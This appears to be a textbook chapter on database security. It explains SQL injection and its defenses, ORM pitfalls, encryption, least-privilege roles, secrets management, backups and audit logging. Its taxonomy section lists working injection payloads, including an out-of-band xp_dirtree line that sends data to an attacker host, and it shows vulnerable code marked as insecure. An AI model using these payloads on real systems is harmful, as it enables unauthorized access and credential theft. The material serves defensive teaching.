---
title: "Chapter 4 — Database Security (Deep Dive)"
---

# Chapter 4 — Database Security (Deep Dive)

## 4.1 SQL Injection — The Most Dangerous Database Attack

SQL injection (SQLi) remains one of the most exploited vulnerabilities in web applications. It occurs when user-supplied input is concatenated into SQL queries without proper sanitization or parameterization.

### How SQL Injection Works

```
    VULNERABLE CODE (Python example):
    ═══════════════════════════════════════════════════════

    # NEVER DO THIS
    query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"

    Normal input:
    username = "alice"
    password = "secret123"
    → SELECT * FROM users WHERE username = 'alice' AND password = 'secret123'
    ✓ Works as expected

    Malicious input:
    username = "' OR '1'='1' --"
    password = "anything"
    → SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = 'anything'
                                                ^^^^^^^^^^^^^^^^
                                                Always true!     ^^
                                                                 Comment, ignores rest

    Result: Returns ALL users. Attacker bypasses authentication.
```

### SQL Injection Attack Taxonomy

```
    SQL INJECTION TYPES
    │
    ├── Classic (In-band)
    │   ├── Union-based
    │   │   Input: ' UNION SELECT username, password FROM admin_users --
    │   │   → Appends admin credentials to normal query results
    │   │
    │   └── Error-based
    │       Input: ' AND 1=CONVERT(int, (SELECT TOP 1 password FROM users)) --
    │       → Database error message reveals the password value
    │
    ├── Blind SQLi (no visible output)
    │   ├── Boolean-based
    │   │   Input: ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='a' --
    │   │   → Page renders normally if true, differently if false
    │   │   → Attacker extracts data one character at a time
    │   │
    │   └── Time-based
    │       Input: ' AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0) --
    │       → Response takes 5 seconds if first char is 'a'
    │       → Works even when no output difference is visible
    │
    ├── Out-of-band
    │   Input: '; EXEC xp_dirtree '\\attacker.com\share' --
    │   → Forces DB server to make DNS/HTTP request to attacker
    │   → Data exfiltrated via DNS queries
    │
    └── Second-order
        Step 1: Register username = "admin'--"
        Step 2: Application stores it in DB (properly escaped for INSERT)
        Step 3: Later, app reads username from DB and uses it in another query
        → The stored malicious value triggers injection in a different code path
```

### Attack Flow Diagram

```
    ┌──────────┐                    ┌──────────────┐                 ┌──────────┐
    │ Attacker │                    │  Web Server  │                 │ Database │
    └────┬─────┘                    └──────┬───────┘                 └────┬─────┘
         │                                 │                              │
         │  POST /login                    │                              │
         │  username: ' OR 1=1 --          │                              │
         │  password: x                    │                              │
         │ ──────────────────────────────▶ │                              │
         │                                 │                              │
         │                                 │  SELECT * FROM users         │
         │                                 │  WHERE username = ''         │
         │                                 │  OR 1=1 --'                  │
         │                                 │  AND password = 'x'          │
         │                                 │ ────────────────────────────▶│
         │                                 │                              │
         │                                 │  Returns ALL rows            │
         │                                 │ ◀────────────────────────────│
         │                                 │                              │
         │  200 OK (logged in as admin)    │                              │
         │ ◀────────────────────────────── │                              │
         │                                 │                              │

    ESCALATION PHASE:
         │                                 │                              │
         │  POST /search                   │                              │
         │  q: ' UNION SELECT              │                              │
         │     table_name, null            │                              │
         │     FROM information_schema     │                              │
         │     .tables --                  │                              │
         │ ──────────────────────────────▶ │                              │
         │                                 │ ────────────────────────────▶│
         │                                 │  Returns table names         │
         │                                 │ ◀────────────────────────────│
         │  Now attacker knows DB schema   │                              │
         │ ◀────────────────────────────── │                              │
         │                                 │                              │
         │  POST /search                   │                              │
         │  q: ' UNION SELECT username,    │                              │
         │     password FROM admin_users-- │                              │
         │ ──────────────────────────────▶ │                              │
         │                                 │ ────────────────────────────▶│
         │                                 │  Returns admin credentials   │
         │                                 │ ◀────────────────────────────│
         │  Full database dump             │                              │
         │ ◀────────────────────────────── │                              │
```

---

## 4.2 Defenses Against SQL Injection

### Prepared Statements (Parameterized Queries) — The Primary Defense

```
    HOW PREPARED STATEMENTS WORK INTERNALLY
    ═══════════════════════════════════════════════════════

    Step 1: PREPARE — SQL template sent to database
    ┌────────────────────────────────────────────────┐
    │  SELECT * FROM users WHERE username = $1       │
    │  AND password = $2                             │
    │                                                │
    │  Database parses and compiles this ONCE.       │
    │  $1 and $2 are parameter slots.                │
    │  The query STRUCTURE is fixed.                 │
    │  No amount of input can change the structure.  │
    └────────────────────────────────────────────────┘

    Step 2: EXECUTE — Parameters sent separately
    ┌────────────────────────────────────────────────┐
    │  $1 = "' OR '1'='1' --"                        │
    │  $2 = "anything"                               │
    │                                                │
    │  Database treats entire $1 as a STRING VALUE.  │
    │  The OR and -- are just characters in a string,│
    │  NOT SQL syntax.                               │
    │                                                │
    │  Executed as:                                  │
    │  WHERE username = ''' OR ''1''=''1'' --'       │
    │  → Looks for literal username containing       │
    │    those characters. Finds nothing. Safe.      │
    └────────────────────────────────────────────────┘

    WHY THIS IS FUNDAMENTALLY SECURE:
    The SQL structure and the data travel in SEPARATE channels.
    The database NEVER interprets user data as SQL code.
    This is not "escaping" — it's a different protocol mechanism.
```

### Code Examples — Secure vs. Insecure

```python
# ═══════════════════════════════════════════
# PYTHON (psycopg2 / PostgreSQL)
# ═══════════════════════════════════════════

# INSECURE — string concatenation
cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")              # ✗ VULNERABLE

# INSECURE — string formatting
cursor.execute("SELECT * FROM users WHERE id = %s" % user_id)           # ✗ VULNERABLE

# SECURE — parameterized query
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))         # ✓ SAFE

# SECURE — with named parameters
cursor.execute("SELECT * FROM users WHERE id = %(id)s", {"id": user_id}) # ✓ SAFE
```

```javascript
// ═══════════════════════════════════════════
// NODE.JS (pg library / PostgreSQL)
// ═══════════════════════════════════════════

// INSECURE
const result = await client.query(`SELECT * FROM users WHERE id = ${userId}`);  // ✗

// SECURE
const result = await client.query('SELECT * FROM users WHERE id = $1', [userId]); // ✓
```

```java
// ═══════════════════════════════════════════
// JAVA (JDBC)
// ═══════════════════════════════════════════

// INSECURE
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery("SELECT * FROM users WHERE id = " + userId); // ✗

// SECURE
PreparedStatement pstmt = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
pstmt.setInt(1, userId);                                                       // ✓
ResultSet rs = pstmt.executeQuery();
```

### Escaping vs. Binding — Why Escaping Is Inferior

```
    ESCAPING (fragile, error-prone):
    ═══════════════════════════════════════════════════════
    Input:  O'Brien
    Escaped: O''Brien  (single quote doubled)

    Problems:
    1. Different databases have different escaping rules
    2. Character encoding mismatches can bypass escaping
       (e.g., GBK encoding in MySQL: 0xbf27 → valid multibyte char + unescaped quote)
    3. Numeric fields: WHERE id = 1 OR 1=1  (no quotes to escape!)
    4. Developer must remember to escape EVERY input EVERY time
    5. One missed escape = vulnerability

    BINDING (parameterization — fundamentally secure):
    ═══════════════════════════════════════════════════════
    - SQL structure and data are separated at the protocol level
    - Works for ALL data types (strings, numbers, dates)
    - No encoding issues
    - Database handles it correctly by design
    - Developer uses the same pattern every time

    VERDICT: Always use parameterized queries. Never rely on escaping alone.
```

---

## 4.3 ORM Security Risks

ORMs (Object-Relational Mappers) generally protect against SQL injection by using parameterized queries internally. But they have their own risks:

```
    ORM RISK 1: Raw query escape hatches
    ═══════════════════════════════════════════════════════

    # Django — safe
    User.objects.filter(email=user_input)

    # Django — DANGEROUS raw query
    User.objects.raw(f"SELECT * FROM users WHERE email = '{user_input}'")  # ✗

    # SQLAlchemy — safe
    session.query(User).filter(User.email == user_input)

    # SQLAlchemy — DANGEROUS text()
    session.execute(text(f"SELECT * FROM users WHERE email = '{user_input}'"))  # ✗

    # SQLAlchemy — safe text() with binding
    session.execute(text("SELECT * FROM users WHERE email = :email"),
                    {"email": user_input})  # ✓


    ORM RISK 2: Mass assignment
    ═══════════════════════════════════════════════════════

    # User sends: {"name": "Alice", "is_admin": true}
    user = User(**request.json)  # ✗ Sets is_admin=true!
    db.session.add(user)

    # Fix: Whitelist allowed fields
    allowed = {"name", "email"}
    data = {k: v for k, v in request.json.items() if k in allowed}
    user = User(**data)  # ✓ Only name and email set


    ORM RISK 3: Ordering injection (Django)
    ═══════════════════════════════════════════════════════

    # User sends: order_by="-password"
    User.objects.order_by(request.GET['order_by'])  # ✗ Reveals password ordering

    # Fix: Whitelist allowed ordering fields
    ALLOWED_ORDERING = {"name", "-name", "created_at", "-created_at"}
    order = request.GET.get('order_by', 'name')
    if order not in ALLOWED_ORDERING:
        order = 'name'
    User.objects.order_by(order)  # ✓


    ORM RISK 4: JSONB/NoSQL injection
    ═══════════════════════════════════════════════════════

    # MongoDB (NoSQL injection)
    # User sends: {"username": {"$gt": ""}, "password": {"$gt": ""}}
    db.users.find(request.json)  # ✗ Returns first user!

    # Fix: Validate that inputs are strings, not objects
    username = request.json.get("username")
    if not isinstance(username, str):
        abort(400)
```

---

## 4.4 Encryption at Rest

### Why Encrypt Data at Rest

Even with strong application-level security, physical access to disk, backups, or decommissioned hardware can expose data. Encryption at rest ensures that stolen storage media is useless without the encryption key.

```
    ENCRYPTION LAYERS
    ═══════════════════════════════════════════════════════

    Layer 1: Full-Disk Encryption (FDE)
    ┌──────────────────────────────────────────────────┐
    │  Encrypts the entire disk/volume                 │
    │  - AWS EBS encryption (AES-256)                  │
    │  - LUKS (Linux Unified Key Setup)                │
    │  - BitLocker (Windows)                           │
    │                                                  │
    │  Protects against: Physical disk theft            │
    │  Does NOT protect against: OS-level access        │
    │  (if the system is running, data is decrypted    │
    │   transparently for any process with disk access) │
    └──────────────────────────────────────────────────┘

    Layer 2: Database-Level Encryption (TDE)
    ┌──────────────────────────────────────────────────┐
    │  Transparent Data Encryption                     │
    │  - PostgreSQL: pgcrypto extension                │
    │  - MySQL: InnoDB tablespace encryption            │
    │  - SQL Server: TDE                               │
    │                                                  │
    │  Encrypts data files, WAL, and temp files         │
    │  Transparent to the application                  │
    │                                                  │
    │  Protects against: File-level access              │
    │  Does NOT protect against: Database-level access  │
    │  (anyone who can query the DB sees plaintext)    │
    └──────────────────────────────────────────────────┘

    Layer 3: Column-Level Encryption
    ┌──────────────────────────────────────────────────┐
    │  Encrypt specific sensitive columns               │
    │                                                  │
    │  -- PostgreSQL with pgcrypto:                    │
    │  INSERT INTO users (email, ssn_encrypted)        │
    │  VALUES ('alice@ex.com',                         │
    │    pgp_sym_encrypt('123-45-6789', 'secret_key'));│
    │                                                  │
    │  SELECT pgp_sym_decrypt(ssn_encrypted,           │
    │    'secret_key') FROM users;                     │
    │                                                  │
    │  Protects against: DB-level access to that column│
    │  Tradeoff: Cannot index encrypted columns         │
    │  (can't search, sort, or join on encrypted data) │
    └──────────────────────────────────────────────────┘

    Layer 4: Application-Level Encryption
    ┌──────────────────────────────────────────────────┐
    │  Encrypt in the application before storing in DB  │
    │                                                  │
    │  # Python example                                │
    │  from cryptography.fernet import Fernet          │
    │  key = Fernet.generate_key()                     │
    │  f = Fernet(key)                                 │
    │  encrypted = f.encrypt(b"sensitive data")        │
    │  # Store encrypted bytes in DB                   │
    │                                                  │
    │  Protects against: DB admin access, DB breach     │
    │  Key never touches the database.                 │
    │  Most secure but most complex.                   │
    │  Must manage key rotation, backup, etc.          │
    └──────────────────────────────────────────────────┘
```

### Envelope Encryption (Industry Best Practice)

```
    ┌─────────────────────────────────────────────────────────────────┐
    │                    ENVELOPE ENCRYPTION                          │
    │                                                                 │
    │  ┌───────────┐    generates    ┌───────────────────┐            │
    │  │  KMS      │ ──────────────▶ │  Data Encryption  │            │
    │  │ (Master   │                 │  Key (DEK)        │            │
    │  │  Key)     │                 │  (random per      │            │
    │  └───────────┘                 │   record/table)   │            │
    │       │                        └─────────┬─────────┘            │
    │       │ encrypts                         │ encrypts             │
    │       ▼                                  ▼                      │
    │  ┌───────────────┐              ┌──────────────────┐            │
    │  │ Encrypted DEK │              │ Encrypted Data   │            │
    │  │ (stored with  │              │ (stored in DB)   │            │
    │  │  the data)    │              │                  │            │
    │  └───────────────┘              └──────────────────┘            │
    │                                                                 │
    │  To decrypt:                                                    │
    │  1. Retrieve encrypted DEK from storage                         │
    │  2. Send encrypted DEK to KMS for decryption                    │
    │  3. Use decrypted DEK to decrypt the data                       │
    │  4. Discard DEK from memory                                     │
    │                                                                 │
    │  Benefits:                                                      │
    │  - Master key never leaves KMS (HSM-backed)                     │
    │  - Each record/table can have its own DEK                       │
    │  - Key rotation: re-encrypt DEKs, not all data                  │
    │  - If one DEK is compromised, only that data is at risk         │
    └─────────────────────────────────────────────────────────────────┘
```

---

## 4.5 Encryption in Transit

```
    WITHOUT TLS:
    ┌──────────┐     SELECT * FROM users     ┌──────────┐
    │   App    │ ───────────────────────────▶ │ Database │
    │  Server  │ ◀─────────────────────────── │          │
    └──────────┘  id=1, password='abc123'     └──────────┘
                        ↑
                  ANYONE ON THE NETWORK
                  CAN READ THIS! (packet sniffing)

    WITH TLS:
    ┌──────────┐     TLS 1.3 encrypted       ┌──────────┐
    │   App    │ ═══════════════════════════▶ │ Database │
    │  Server  │ ◀═══════════════════════════ │          │
    └──────────┘  0x8A3F...encrypted...B2C1   └──────────┘
                        ↑
                  INTERCEPTED DATA IS
                  USELESS WITHOUT KEYS

    PostgreSQL TLS configuration:
    ┌──────────────────────────────────────────────────┐
    │  # postgresql.conf                               │
    │  ssl = on                                        │
    │  ssl_cert_file = 'server.crt'                    │
    │  ssl_key_file = 'server.key'                     │
    │  ssl_ca_file = 'ca.crt'  # for client cert auth │
    │                                                  │
    │  # pg_hba.conf — require SSL                     │
    │  hostssl all all 0.0.0.0/0 scram-sha-256         │
    │  # 'hostssl' instead of 'host' forces TLS        │
    └──────────────────────────────────────────────────┘

    Mutual TLS (mTLS):
    Both client and server present certificates.
    Server verifies client identity via certificate.
    Strongest transport security for database connections.
```

---

## 4.6 Access Control

### Principle of Least Privilege

```
    BAD: Application connects as superuser
    ═══════════════════════════════════════════════════════
    Application → connects as 'postgres' (superuser)
    Can: CREATE/DROP databases, read pg_shadow, execute OS commands
    If compromised: attacker owns EVERYTHING

    GOOD: Separate roles with minimal permissions
    ═══════════════════════════════════════════════════════

    -- Create application role with minimal permissions
    CREATE ROLE app_user LOGIN PASSWORD 'strong_password';

    -- Grant only what's needed
    GRANT SELECT, INSERT, UPDATE ON users TO app_user;
    GRANT SELECT ON products TO app_user;
    GRANT USAGE ON SEQUENCE users_id_seq TO app_user;

    -- Explicitly deny dangerous operations
    REVOKE CREATE ON SCHEMA public FROM app_user;
    REVOKE ALL ON pg_catalog.pg_shadow FROM app_user;

    -- Create read-only role for reporting
    CREATE ROLE reporting_user LOGIN PASSWORD 'another_password';
    GRANT SELECT ON ALL TABLES IN SCHEMA public TO reporting_user;

    -- Create migration role (used only during deployments)
    CREATE ROLE migration_user LOGIN PASSWORD 'migration_password';
    GRANT ALL ON ALL TABLES IN SCHEMA public TO migration_user;
    GRANT ALL ON ALL SEQUENCES IN SCHEMA public TO migration_user;
```

### Row-Level Security (PostgreSQL)

```sql
-- Enable RLS on the table
ALTER TABLE documents ENABLE ROW LEVEL SECURITY;

-- Policy: Users can only see their own documents
CREATE POLICY user_documents ON documents
    FOR ALL
    USING (owner_id = current_setting('app.current_user_id')::int);

-- Policy: Admins can see everything
CREATE POLICY admin_all ON documents
    FOR ALL
    TO admin_role
    USING (true);

-- Set user context before queries
SET app.current_user_id = '42';
SELECT * FROM documents;  -- Only returns documents where owner_id = 42
```

```
    HOW RLS WORKS INTERNALLY
    ═══════════════════════════════════════════════════════

    Without RLS:
    SELECT * FROM documents;
    → Returns ALL rows

    With RLS:
    SELECT * FROM documents;
    → Internally rewritten to:
    SELECT * FROM documents WHERE owner_id = 42;
    → Only returns user's own documents

    The WHERE clause is ALWAYS appended, even for:
    UPDATE documents SET title = 'new' WHERE id = 99;
    → Rewritten to:
    UPDATE documents SET title = 'new'
    WHERE id = 99 AND owner_id = 42;
    → If document 99 belongs to user 43, update affects 0 rows.

    This is TRANSPARENT to the application.
    Even if app has a bug that exposes another user's document ID,
    the database itself prevents access.
```

---

## 4.7 Secrets Management

```
    BAD: Secrets in code / config files
    ═══════════════════════════════════════════════════════

    # config.py
    DATABASE_URL = "postgres://admin:P@ssw0rd@db.example.com/mydb"  # ✗
    # Checked into git → visible to everyone with repo access
    # Appears in CI/CD logs
    # Hardcoded → can't rotate without redeploying

    GOOD: Secrets from external vault
    ═══════════════════════════════════════════════════════

    ┌──────────┐     1. Request secret    ┌──────────────┐
    │   App    │ ────────────────────────▶ │  Vault       │
    │  Server  │                           │ (HashiCorp,  │
    │          │     2. Authenticate       │  AWS Secrets │
    │          │        (IAM role,         │  Manager)    │
    │          │         k8s service acct) │              │
    │          │                           │              │
    │          │ ◀──────────────────────── │              │
    │          │     3. Return secret      │              │
    │          │        (short-lived,      │              │
    │          │         auto-rotated)     │              │
    └──────────┘                           └──────────────┘

    Best practices:
    ┌──────────────────────────────────────────────────────┐
    │  ✓ Store secrets in a vault (HashiCorp Vault, AWS    │
    │    Secrets Manager, GCP Secret Manager)              │
    │  ✓ Use IAM roles / service accounts for auth         │
    │    (no passwords to manage!)                         │
    │  ✓ Rotate secrets automatically                      │
    │  ✓ Audit secret access                               │
    │  ✓ Use short-lived credentials (dynamic secrets)     │
    │  ✓ .gitignore all .env files                         │
    │  ✓ Scan git history for leaked secrets (truffleHog,  │
    │    git-secrets)                                       │
    │  ✗ Never log secrets (mask in log output)            │
    │  ✗ Never pass secrets via URL query parameters       │
    │  ✗ Never store secrets in environment variables in    │
    │    container images (visible via docker inspect)     │
    └──────────────────────────────────────────────────────┘
```

---

## 4.8 Backup Security

```
    BACKUP THREAT MODEL
    ═══════════════════════════════════════════════════════

    Your database has strong access controls.
    Your backups are stored in S3 with public access.
    Attacker downloads the backup.
    Game over.

    ┌─────────────┐ pg_dump ┌───────────────┐  upload  ┌──────────┐
    │  Database   │ ──────▶ │ Backup file   │ ───────▶ │  S3      │
    │ (encrypted, │         │ (PLAINTEXT!   │          │ (public  │
    │  secured)   │         │  all data     │          │  bucket) │
    └─────────────┘         │  exposed)     │          └──────────┘
                            └───────────────┘               ↑
                                                      Attacker downloads

    SECURE BACKUP PIPELINE
    ═══════════════════════════════════════════════════════

    ┌─────────────┐ pg_dump ┌───────────┐ encrypt  ┌───────────┐ upload ┌──────────┐
    │  Database   │ ──────▶ │ Backup    │ ───────▶ │ Encrypted │ ─────▶ │  S3      │
    └─────────────┘         │ (plain)   │ AES-256  │ backup    │        │ (private │
                            └───────────┘          └───────────┘        │  bucket, │
                                                                        │  SSE-KMS,│
                                                                        │  versioned│
                                                                        │  MFA del) │
                                                                        └──────────┘

    Backup security checklist:
    ┌──────────────────────────────────────────────────────┐
    │  ✓ Encrypt backups at rest (gpg, AWS KMS)            │
    │  ✓ Encrypt backups in transit (TLS for upload)       │
    │  ✓ Restrict access (IAM policies, separate account)  │
    │  ✓ Enable versioning (prevent accidental deletion)   │
    │  ✓ Enable MFA delete (prevent malicious deletion)    │
    │  ✓ Test restore process regularly                    │
    │  ✓ Audit backup access                               │
    │  ✓ Retention policy (delete old backups per policy)  │
    │  ✓ Separate backup credentials from app credentials  │
    │  ✓ Store backup keys separately from backup data     │
    └──────────────────────────────────────────────────────┘
```

---

## 4.9 Audit Logging

```sql
-- PostgreSQL audit logging with pgAudit extension

-- Install and configure
-- postgresql.conf:
-- shared_preload_libraries = 'pgaudit'
-- pgaudit.log = 'write, ddl'  -- Log writes and DDL

-- What gets logged:
-- 2024-01-15 10:30:45 UTC LOG: AUDIT: SESSION,1,1,WRITE,INSERT,,
--   "INSERT INTO users (name, email) VALUES ('Alice', 'alice@ex.com')"
-- 2024-01-15 10:31:12 UTC LOG: AUDIT: SESSION,2,1,DDL,ALTER TABLE,,
--   "ALTER TABLE users ADD COLUMN is_admin BOOLEAN"

-- Custom audit table approach:
CREATE TABLE audit_log (
    id BIGSERIAL PRIMARY KEY,
    table_name TEXT NOT NULL,
    operation TEXT NOT NULL,    -- INSERT, UPDATE, DELETE
    old_data JSONB,
    new_data JSONB,
    changed_by TEXT NOT NULL,
    changed_at TIMESTAMPTZ DEFAULT NOW(),
    ip_address INET,
    query TEXT
);

-- Trigger function for automatic audit logging
CREATE OR REPLACE FUNCTION audit_trigger_func()
RETURNS TRIGGER AS $$
BEGIN
    INSERT INTO audit_log (table_name, operation, old_data, new_data, changed_by)
    VALUES (
        TG_TABLE_NAME,
        TG_OP,
        CASE WHEN TG_OP IN ('UPDATE', 'DELETE') THEN row_to_json(OLD)::jsonb END,
        CASE WHEN TG_OP IN ('INSERT', 'UPDATE') THEN row_to_json(NEW)::jsonb END,
        current_setting('app.current_user', true)
    );
    RETURN COALESCE(NEW, OLD);
END;
$$ LANGUAGE plpgsql;

-- Apply to sensitive tables
CREATE TRIGGER audit_users
    AFTER INSERT OR UPDATE OR DELETE ON users
    FOR EACH ROW EXECUTE FUNCTION audit_trigger_func();
```

```
    WHAT TO AUDIT
    ═══════════════════════════════════════════════════════

    ┌───────────────────────────────────────────────────┐
    │  Authentication events (login, logout, failures)  │
    │  Authorization failures (access denied)           │
    │  Data access to sensitive tables                  │
    │  Schema changes (DDL: CREATE, ALTER, DROP)        │
    │  Permission changes (GRANT, REVOKE)               │
    │  Bulk data exports                                │
    │  Configuration changes                            │
    │  Backup/restore operations                        │
    │  Superuser activity                               │
    └───────────────────────────────────────────────────┘

    AUDIT LOG SECURITY
    ═══════════════════════════════════════════════════════
    - Audit logs must be append-only (no DELETE permission)
    - Store in separate database/service from application
    - Ship to SIEM (Splunk, ELK) in real-time
    - Alert on suspicious patterns:
      - Unusual query patterns (bulk SELECT from PII tables)
      - Login from new IP addresses
      - Schema changes outside deployment windows
      - Privilege escalation attempts
```

---

## 4.10 Database Security Checklist

```
    PRE-DEPLOYMENT
    ═══════════════════════════════════════════════════════
    □ All queries use parameterized statements
    □ ORM raw query usage is audited and parameterized
    □ Input validation at application layer
    □ Database roles follow principle of least privilege
    □ Application never connects as superuser
    □ Row-level security enabled for multi-tenant data
    □ Sensitive columns encrypted (SSN, credit cards, etc.)
    □ TLS required for all database connections
    □ Connection strings use secrets manager (not hardcoded)
    □ Database not accessible from public internet
    □ Firewall rules limit access to application servers only
    □ Default database accounts disabled/removed
    □ Strong passwords (or certificate auth) for all DB users

    POST-DEPLOYMENT
    ═══════════════════════════════════════════════════════
    □ Audit logging enabled and monitored
    □ Automated backup with encryption
    □ Backup restore tested monthly
    □ Vulnerability scanning (SQLMap in test environment)
    □ Dependency updates for database drivers
    □ Regular review of granted permissions
    □ Monitor for unusual query patterns
    □ Alert on authentication failures
    □ Patch database software promptly (CVE monitoring)
    □ Rotate credentials quarterly
```
